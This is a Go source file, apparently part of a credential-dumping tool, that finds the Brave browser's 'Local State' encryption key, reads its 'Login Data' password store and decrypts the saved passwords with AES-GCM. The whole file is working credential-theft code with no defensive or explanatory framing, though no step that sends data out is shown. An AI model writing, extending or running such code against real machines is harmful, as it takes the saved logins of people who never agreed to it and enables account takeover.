package internals

import (
	"crypto/aes"
	"crypto/cipher"
	"errors"
	"fmt"
	"os"
)

type Brave struct {
	name          string
	basePath      string
	decryptionKey []byte // found in "Local State"
}

func NewBrave() (Brave, error) {
	fmt.Print("[+] Initializing Brave\n")
	name := "brave"
	homeDir, _ := os.UserHomeDir()
	basePath, err := getChromiumBasePath(name)
	if err != nil {
		return Brave{name, basePath, nil}, err
	} else {
		basePath = homeDir + basePath
	}

	decKey, err := getChromiumDecryptionKey(fmt.Sprintf("%s\\%s", basePath, "Local State"))
	if err != nil {
		return Brave{name, basePath, nil}, err
	}

	return Brave{name, basePath, decKey}, nil
}

// TODO: refactor, only thing that changes is basePath
func (b Brave) DumpCredentials() ([][]Credentials, error) {
	fmt.Print("[+] Dumping Brave Credentials\n")

	// Brave uses only one profile
	dump := make([][]Credentials, 1)
	credentials, err := getChromiumCredentials(fmt.Sprintf("%s\\%s", b.basePath, "Default\\Login Data"))
	if err != nil {
		return nil, err
	}

	if len(credentials) == 0 {
		return dump, errors.New("[!] No credentials")
	}

	for i := range credentials {
		b.DecryptPassword(&credentials[i].Password)
	}
	dump = append(dump, credentials)

	return dump, nil
}

// TODO: refactor, is the same for chrome
func (b Brave) DecryptPassword(psw *[]byte) {
	password := *psw
	iv := password[3:15]
	ps := password[15:]

	block, err := aes.NewCipher(b.decryptionKey)
	if err != nil {
		panic(err.Error())
	}

	aesgcm, err := cipher.NewGCM(block)
	if err != nil {
		panic(err.Error())
	}

	plain, err := aesgcm.Open(nil, iv, ps, nil)
	*psw = plain
}
